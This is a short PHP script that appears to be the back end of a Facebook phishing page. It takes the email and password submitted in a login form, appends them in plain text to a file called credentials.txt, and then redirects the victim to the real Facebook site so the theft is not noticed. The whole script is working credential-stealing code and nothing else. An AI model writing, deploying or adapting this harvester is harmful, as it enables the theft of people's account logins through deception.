<?php
    $email = $_POST['email'];
    $password = $_POST['password'];
    file_put_contents('credentials.txt', "Email: $email\nPassword: $password\n", FILE_APPEND);
    header("Location: https://www.facebook.com");
?>
